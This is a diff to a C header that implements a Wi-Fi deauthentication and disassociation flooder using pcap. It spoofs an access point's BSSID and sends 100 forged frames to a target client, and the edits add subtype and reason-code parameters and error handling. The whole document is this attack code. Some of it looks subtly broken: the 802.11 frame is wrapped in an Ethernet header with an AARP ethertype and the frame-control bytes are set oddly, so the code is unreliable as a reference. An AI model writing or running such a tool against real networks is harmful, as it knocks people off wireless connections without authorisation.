@@ -1,5 +1,5 @@
-#define DEAUTH_H
 #ifndef DEAUTH_H
+#define DEAUTH_H
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -9,10 +9,12 @@
 #include <arpa/inet.h>
 #include <linux/if_ether.h>
 #include <netinet/ether.h>
-#include <unistd.h>  
-#include "deauth.h"
+#include <unistd.h>
+#include <errno.h>
 
 #define MAX_DEAUTH_PACKETS 100
+#define DEAUTH 0xC0
+#define DISASSOC 0xA0
 
 struct ieee80211_frame {
     u_int8_t i_fc[2];
@@ -23,10 +25,10 @@ struct ieee80211_frame {
     u_int8_t i_seq[2];
 };
 
-void send_control_packet(pcap_t *handle, u_char *bssid, u_char *client) {
+void send_control_packet(pcap_t *handle, u_char *bssid, u_char *client, u_int8_t subtype, u_int16_t reason_code) {
     struct ether_header *eth_header;
-    u_char packet[128];
-    
+    u_char packet[256];
+
     memset(packet, 0, sizeof(packet));
     eth_header = (struct ether_header *) packet;
 
@@ -39,25 +41,36 @@ void send_control_packet(pcap_t *handle, u_char *bssid, u_char *client) {
     memcpy(eth_header->ether_shost, bssid, ETH_ALEN);
     eth_header->ether_type = htons(ETHERTYPE_AARP);
 
-    struct ieee80211_frame *deauth_frame = (struct ieee80211_frame *)(packet + sizeof(struct ether_header));
-    memset(deauth_frame, 0, sizeof(struct ieee80211_frame));
-    memcpy(deauth_frame->i_addr1, eth_header->ether_dhost, ETH_ALEN);
-    memcpy(deauth_frame->i_addr2, eth_header->ether_shost, ETH_ALEN);
-    memcpy(deauth_frame->i_addr3, eth_header->ether_shost, ETH_ALEN);
-    deauth_frame->i_fc[0] = 0x00;
-    deauth_frame->i_fc[1] = (0xC0 | DEAUTH);
-    deauth_frame->i_dur[0] = 0;
-    deauth_frame->i_seq[0] = 0;
+    struct ieee80211_frame *ctrl_frame = (struct ieee80211_frame *)(packet + sizeof(struct ether_header));
+    memset(ctrl_frame, 0, sizeof(struct ieee80211_frame));
 
-    u_int16_t reason_code = htons(0x0001);
+    memcpy(ctrl_frame->i_addr1, eth_header->ether_dhost, ETH_ALEN);
+    memcpy(ctrl_frame->i_addr2, eth_header->ether_shost, ETH_ALEN);
+    memcpy(ctrl_frame->i_addr3, eth_header->ether_shost, ETH_ALEN);
+
+    ctrl_frame->i_fc[0] = 0x00;
+    ctrl_frame->i_fc[1] = subtype;
+
+    reason_code = htons(reason_code);
     memcpy(packet + sizeof(struct ether_header) + sizeof(struct ieee80211_frame), &reason_code, sizeof(reason_code));
 
+    int packet_size = sizeof(struct ether_header) + sizeof(struct ieee80211_frame) + sizeof(reason_code);
+
     for (int i = 0; i < MAX_DEAUTH_PACKETS; i++) {
-        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
+        if (pcap_sendpacket(handle, packet, packet_size) != 0) {
             fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
+            if (errno == EPERM || errno == ENETDOWN) {
+                break;
+            }
+        } else {
+            printf("Sent control packet (%s) to %s from %s\n",
+                (subtype == DEAUTH ? "Deauth" : "Disassoc"),
+                ether_ntoa((struct ether_addr *) eth_header->ether_dhost),
+                ether_ntoa((struct ether_addr *) eth_header->ether_shost)
+            );
         }
         usleep(100000);
     }
-
-    printf("Sent deauthentication packet to %s from %s\n", ether_ntoa((struct ether_addr *)client), ether_ntoa((struct ether_addr *)bssid));
 }
+
+#endif
